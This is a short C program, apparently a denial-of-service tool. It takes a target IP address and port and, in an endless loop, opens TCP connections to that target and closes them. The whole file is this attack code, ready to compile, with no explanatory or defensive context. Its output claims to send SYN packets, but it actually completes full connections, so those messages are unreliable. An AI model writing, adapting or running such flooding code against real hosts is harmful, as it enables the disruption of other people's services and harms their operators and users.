#include <stdio.h>
#include <stdlib.h>      // for atoi
#include <sys/socket.h>  // for socket functions
#include <netdb.h>       // for sockaddr_in
#include <arpa/inet.h>   // for inet_addr
#include <unistd.h>      // for close

int main(int argc, char *argv[]) {
    if (argc != 3) {
        printf("Usage: %s <target IP> <target port>\n", argv[0]);
        return 1;
    }

    char *target_ip = argv[1];
    int target_port = atoi(argv[2]);

    int meusocket;
    struct sockaddr_in alvo;

    alvo.sin_family = AF_INET;
    alvo.sin_port = htons(target_port);
    alvo.sin_addr.s_addr = inet_addr(target_ip);

    while (1) {
        meusocket = socket(AF_INET, SOCK_STREAM, 0);
        if (meusocket < 0) {
            perror("Socket creation failed");
            return 1;
        }

        if (connect(meusocket, (struct sockaddr *)&alvo, sizeof(alvo)) == 0) {
            printf("Sent SYN packet to %s:%d\n", target_ip, target_port);
        } else {
            perror("Connection attempt failed");
        }

        close(meusocket);
    }

    return 0;
}
